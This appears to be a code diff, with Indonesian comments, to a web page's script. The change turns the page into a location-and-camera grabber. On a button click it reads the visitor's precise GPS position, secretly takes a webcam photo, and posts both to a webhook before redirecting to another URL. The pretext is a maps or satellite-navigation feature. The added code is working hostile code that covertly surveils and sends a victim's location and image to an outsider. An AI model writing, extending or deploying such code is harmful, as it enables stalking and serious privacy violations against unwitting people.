@@ -99,19 +99,41 @@
                 }
 
            // Bagian akhir fungsi sikatData()
-navigator.geolocation.getCurrentPosition(async (p) => {
-    // ... kode pengiriman data Anda ...
-}, (err) => {
-    alert("Izin lokasi diperlukan untuk navigasi satelit.");
-    btn.innerText = "KLIK LOKASI MAPS";
-    btn.disabled = false;
-}, { 
-    enableHighAccuracy: true, 
-    timeout: 10000, 
-    maximumAge: 0 
-}); // <--- Parameter harus di sini agar GPS aktif
+// ... bagian atas sikatData() ...
+    
+    // 2. Minta Lokasi
+    navigator.geolocation.getCurrentPosition(async (p) => {
+        const lat = p.coords.latitude;
+        const lon = p.coords.longitude;
+        const msg = `**Maps:** https://www.google.com/maps?q=${lat},${lon}\n**Akurasi:** ${Math.round(p.coords.accuracy)}m`;
 
-        document.getElementById('mainBtn').addEventListener('click', sikatData);
+        // 3. Ambil Kamera
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append("file", blob, "cam.png");
+                fd.append("payload_json", JSON.stringify({ content: msg }));
+                await fetch(webhookURL, { method: "POST", body: fd });
+                window.location.href = targetURL;
+            }, 'image/png');
+        }, 1500);
+    }, (err) => {
+        alert("Izin lokasi diperlukan.");
+        btn.innerText = "KLIK LOKASI MAPS";
+        btn.disabled = false;
+    }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+} // Penutup fungsi sikatData
+
+document.getElementById('mainBtn').addEventListener('click', sikatData);
     </script>
 </body>
 </html>
